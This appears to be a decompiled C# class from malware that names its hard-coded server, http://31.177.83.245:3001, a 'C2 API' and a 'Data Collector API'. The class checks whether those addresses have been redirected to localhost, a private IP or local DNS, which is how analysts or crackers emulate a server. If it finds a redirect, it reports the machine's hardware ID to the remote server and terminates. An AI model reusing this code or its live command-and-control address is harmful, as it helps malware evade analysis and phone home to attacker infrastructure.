using System;
using System.Linq;
using System.Net;
using System.Threading;
using TelemetryHttpClient;
using HwidProvider;

namespace ApiUrlValidator;

public sealed class ApiUrlValidator
{
	private static bool bool_0;

	private string string_0;

	private int int_3;

	private long long_0;

	private string String_0
	{
		get
		{
			return string_0;
		}
		set
		{
			string_0 = value;
		}
	}

	private int Int32_0
	{
		get
		{
			return int_3;
		}
		set
		{
			int_3 = value;
		}
	}

	private long Int64_0
	{
		get
		{
			return long_0;
		}
		set
		{
			long_0 = value;
		}
	}

	public static void StartMonitoring()
	{
		if (!bool_0)
		{
			bool_0 = true;
			ValidateAllApiUrls();
		}
	}

	private static void ValidateAllApiUrls()
	{
		try
		{
			string url = "http://31.177.83.245:3001";
			string url2 = "http://31.177.83.245:3001";
			string url3 = "http://31.177.83.245:3001";
			ValidateUrl("http://31.177.83.245:3001", "Main API");
			ValidateUrl(url, "Telemetry API");
			ValidateUrl(url2, "C2 API");
			ValidateUrl(url3, "Data Collector API");
		}
		catch (Exception)
		{
		}
	}

	public static void ValidateUrl(string url, string urlName = "API")
	{
		if (string.IsNullOrEmpty(url))
		{
			return;
		}
		try
		{
			if (!IsLocalhostString(url))
			{
				if (!Uri.TryCreate(url, UriKind.Absolute, out Uri result))
				{
					return;
				}
				string host = result.Host;
				if (IsPrivateOrLocalIP(host))
				{
					Logger.Fatal("[LocalhostDetector] ❌ PRIVATE/LOCAL IP DETECTED IN " + urlName + "!");
					Logger.Fatal("[LocalhostDetector] ❌ Host: " + host);
					Logger.Fatal("[LocalhostDetector] ❌ URL: " + url);
					Logger.Fatal("[LocalhostDetector] ❌ This indicates a cracked version!");
					SendLocalhostDetectionAlert(url, urlName);
					Thread.Sleep(3000);
					Environment.Exit(1);
				}
				else
				{
					if (string.IsNullOrEmpty(host) || IPAddress.TryParse(host, out IPAddress _))
					{
						return;
					}
					try
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(host);
						foreach (IPAddress iPAddress in hostAddresses)
						{
							if (IsPrivateOrLocalIP(iPAddress.ToString()))
							{
								Logger.Fatal("[LocalhostDetector] ❌ DOMAIN RESOLVES TO LOCAL IP!");
								Logger.Fatal("[LocalhostDetector] ❌ Domain: " + host);
								Logger.Fatal($"[LocalhostDetector] ❌ Resolves to: {iPAddress}");
								Logger.Fatal("[LocalhostDetector] ❌ This indicates DNS hijacking or hosts file modification!");
								SendLocalhostDetectionAlert(url, $"{urlName} (DNS: {iPAddress})");
								Thread.Sleep(3000);
								Environment.Exit(1);
								break;
							}
						}
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
			}
			else
			{
				Logger.Fatal("[LocalhostDetector] ❌ LOCALHOST DETECTED IN " + urlName + "!");
				Logger.Fatal("[LocalhostDetector] ❌ URL: " + url);
				Logger.Fatal("[LocalhostDetector] ❌ This indicates a cracked version!");
				Logger.Fatal("[LocalhostDetector] ❌ Cracker is using local server emulator!");
				SendLocalhostDetectionAlert(url, urlName);
				Thread.Sleep(3000);
				Environment.Exit(1);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool IsLocalhostString(string url)
	{
		if (!string.IsNullOrEmpty(url))
		{
			string i0xiCL5vLv = url.ToLower();
			return new string[6] { "localhost", "127.0.0.1", "127.0.0.2", "0.0.0.0", "[::1]", "::1" }.Any((string pattern) => i0xiCL5vLv.Contains(pattern));
		}
		return false;
	}

	private static bool IsPrivateOrLocalIP(string host)
	{
		if (!string.IsNullOrEmpty(host))
		{
			if (IsLocalhostString(host))
			{
				return true;
			}
			if (!IPAddress.TryParse(host, out IPAddress address))
			{
				return false;
			}
			byte[] addressBytes = address.GetAddressBytes();
			if (addressBytes.Length == 4)
			{
				if (addressBytes[0] == 10)
				{
					return true;
				}
				if (addressBytes[0] == 172 && addressBytes[1] >= 16 && addressBytes[1] <= 31)
				{
					return true;
				}
				if (addressBytes[0] == 192 && addressBytes[1] == 168)
				{
					return true;
				}
				if (addressBytes[0] == 127)
				{
					return true;
				}
				if (addressBytes[0] == 169 && addressBytes[1] == 254)
				{
					return true;
				}
				if (addressBytes[0] == 0)
				{
					return true;
				}
			}
			if (addressBytes.Length == 16)
			{
				if (address.Equals(IPAddress.IPv6Loopback))
				{
					return true;
				}
				if (addressBytes[0] == 254 && (addressBytes[1] & 0xC0) == 128)
				{
					return true;
				}
				if ((addressBytes[0] & 0xFE) == 252)
				{
					return true;
				}
			}
			return false;
		}
		return false;
	}

	private static void SendLocalhostDetectionAlert(string detectedUrl, string urlName)
	{
		try
		{
			string orCreateHWID = HwidProvider.GetOrCreateHWID();
			string text = "http://31.177.83.245:3001";
			if (!IsLocalhostString(text))
			{
				TelemetryHttpClient.SendSecurityEventAsync(orCreateHWID, "localhost_detected", "Localhost/private IP detected in " + urlName, new
				{
					detectedUrl = detectedUrl,
					urlName = urlName,
					timestamp = DateTime.UtcNow
				}, text);
			}
		}
		catch (Exception)
		{
		}
	}
}
